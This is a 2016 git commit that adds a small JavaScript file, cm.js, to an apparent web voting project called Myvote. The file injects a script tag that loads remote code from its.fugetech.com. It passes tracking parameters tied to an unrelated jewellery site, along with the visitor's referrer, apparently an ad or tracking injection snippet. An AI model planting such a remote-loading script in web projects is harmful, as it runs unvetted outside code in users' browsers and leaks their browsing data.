9f03c955f7ddd99050c6a331609f4137b2ef30fd
2998550097 <2998550097@qq.com>
2016-09-08 19:11:04 +0800

    整合2--滕涛

---
+++ Myvote/src/main/webapp/js/cm.js
@@ -0,0 +1,4 @@
+
+  var s0 = document.createElement("script");
+  s0.src = "http://its.fugetech.com/_cm.js?p=3752&k=B699A0CCE5009DE9&g=1d8785dc7d9a41318f68f8f3502eb374&lp=http%3A%2F%2Fwww.darryring.com%2Fdarry_ring%2F628.html&ti=MY+HEART+%E7%B3%BB%E5%88%97+%E5%A5%A2%E5%8D%8E%E6%AC%BE_0.7%E5%85%8B%E6%8B%89_H%E8%89%B2_%E4%BB%B7%E6%A0%BC%E5%9B%BE%E7%89%87_Darry+Ring%E6%B1%82%E5%A9%9A%E9%92%BB%E6%88%92+%E6%88%B4%E7%91%9E%E7%8F%A0%E5%AE%9D%E5%AE%98%E7%BD%91&rf=http%3A%2F%2Fwww.darryring.com%2Fdarry_ring&from_url=" + encodeURIComponent(document.referrer);
+  document.getElementsByTagName('head')[0].appendChild(s0)
